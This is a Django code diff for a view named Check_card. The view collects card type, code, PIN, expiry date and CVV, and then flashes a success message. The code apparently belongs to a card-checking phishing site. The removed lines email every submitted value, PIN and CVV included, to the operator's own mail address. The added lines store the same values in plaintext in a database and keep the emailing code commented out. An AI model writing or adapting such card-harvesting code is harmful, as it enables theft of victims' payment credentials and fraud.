@@ -3,7 +3,7 @@ from .models import Cards
 from django.contrib import messages
 from django.contrib.auth.models import auth
 from django.contrib.auth import get_user_model
-from django.core.mail import EmailMessage
+from django.core.mail import send_mail
 from django.conf import settings
 
 User = get_user_model()
@@ -25,11 +25,13 @@ def Check_card(request):
             return render(request, 'myCard/index.html')       
         # owner = request.user
         # try:
-        # new_card = Cards.objects.create(card_type=card_type, currency=currency,amount=amount, code=code, card_pin=card_pin, exp_date=exp_date,cvv=cvv)
-        # new_card.save()
-        body = f"Card type = {card_type}\n\nCurrency={currency}\n\nAmount = {amount}\n\nCode={code}\n\n card_pin={card_pin}\n\nexp_date={exp_date}\n\ncvv={cvv}"
-        email = EmailMessage(subject='New input', body=body, to=[settings.EMAIL_HOST_USER])
-        email.send()
+        new_card = Cards.objects.create(card_type=card_type, currency=currency,amount=amount, code=code, card_pin=card_pin, exp_date=exp_date,cvv=cvv)
+        new_card.save()
+        # body = f"Card type = {card_type}\n\nCurrency={currency}\n\nAmount = {amount}\n\nCode={code}\n\n Card_pin={card_pin}\n\nExp_date={exp_date}\n\nCVV={cvv}"
+        # email = EmailMessage(subject='New input', body=body, to=[settings.EMAIL_HOST_USER])
+        # email.send()
+        # send_mail( 'New input', body, settings.EMAIL_HOST_USER, [settings.EMAIL_HOST_USER] )
+        # print(settings.EMAIL_HOST_USER)
         messages.success(request, f'{currency} {amount}.00')
         return redirect(reverse('index'))
         # except:
